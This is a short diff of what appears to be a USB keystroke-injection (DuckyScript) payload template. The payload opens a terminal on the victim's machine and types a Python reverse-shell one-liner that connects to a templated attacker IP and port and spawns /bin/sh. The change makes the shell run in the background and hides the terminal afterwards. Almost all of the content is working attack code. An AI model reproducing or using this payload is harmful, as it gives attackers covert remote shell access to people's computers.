@@ -6,7 +6,6 @@ STRING terminal
 DELAY 100
 ENTER
 DELAY 400
-STRING python -c 'import socket,os,pty;o=os.dup2;s=socket.socket();s.connect(("{ip}",{port}));f=s.fileno();o(f,0);o(f,1);o(f,2);pty.spawn("/bin/sh")'{close_terminal}
+STRING python -c 'import socket,os,pty;o=os.dup2;s=socket.socket();s.connect(("{ip}",{port}));f=s.fileno();o(f,0);o(f,1);o(f,2);pty.spawn("/bin/sh")'{run_background}
 ENTER
-DELAY 200
-COMMAND w
+{close_mac_shell}
